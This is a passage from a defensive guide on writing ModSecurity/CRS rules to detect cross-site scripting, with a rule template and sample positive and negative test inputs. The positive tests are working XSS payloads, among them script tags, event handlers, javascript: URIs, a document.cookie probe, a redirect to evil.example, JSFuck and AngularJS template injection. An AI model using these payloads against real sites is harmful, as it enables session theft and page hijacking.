## Proposed ModSecurity Rule

```apache
SecRule ...
```

## Transformations Used

- `t:none`:
- `t:urlDecodeUni`:
- `t:htmlEntityDecode`:
- `t:jsDecode`:
- `t:cssDecode`:
- `t:removeNulls`:
- other:

## Why the Rule Matches the Bypass

Explain how the target, operator, regex/phrase, and transformations match the observed payload.

## False Positives and Tuning Notes

Explain affected parameters, cookies, headers, body fields, paths, and suggested exclusions.

## Test Cases

Positive tests:
- payload:
- expected match:

Negative tests:
- benign input:
- expected no match:
```

---

# 26. Recommended Positive and Negative Test Cases

## 26.1 Script Tag Tests

Positive:

```text
?q=<script>alert(1)</script>
?q=%3Cscript%3Ealert(1)%3C/script%3E
```

Negative:

```text
?q=script documentation
?q=how to write a script tag safely
```

## 26.2 Event Handler Tests

Positive:

```text
?q=<img src=x onerror=alert(1)>
?q=%3Csvg%20onload%3Dalert(1)%3E
```

Negative:

```text
?q=on error handling documentation
?q=image upload failed
```

## 26.3 JavaScript URI Tests

Positive:

```text
?q=<a href=javascript:alert(1)>click</a>
?q=url(javascript:alert(1))
```

Negative:

```text
?q=javascript documentation
?q=url parameters
```

## 26.4 DOM Keyword Tests

Positive:

```text
?q=document.cookie
?q=window.location='https://evil.example'
```

Negative:

```text
?q=browser API documentation
?q=JavaScript tutorial page
```

## 26.5 JSFuck Tests

Positive:

```text
?q=!![]
?q=!+[]
?q=! []
```

Negative:

```text
?q=array tutorial []
?q=not an array
```

## 26.6 AngularJS Template Injection Tests

Positive:

```text
?q={{constructor.constructor('alert(1)')()}}
?q={{7*7}}
```

Negative:

```text
?q=template documentation
?q=literal braces example
```

---

# 27. Final Note for Retrieval

This document should rank highly for:

- ModSecurity XSS rule generation
- OWASP CRS 941 XSS rules
- `SecRule` XSS transformations
- XSS bypass payload normalization
- event handler XSS
- script tag XSS
- JavaScript URI XSS
- DOM keyword XSS
- JSFuck XSS
- AngularJS template injection
- CRS paranoia levels
- CRS anomaly scoring
- CRS false-positive tuning

This document should not be the primary retrieval target for SQL injection payload rule generation. For SQLi, retrieve CRS 942 SQL Injection rules or a dedicated SQLi ModSecurity rule document.
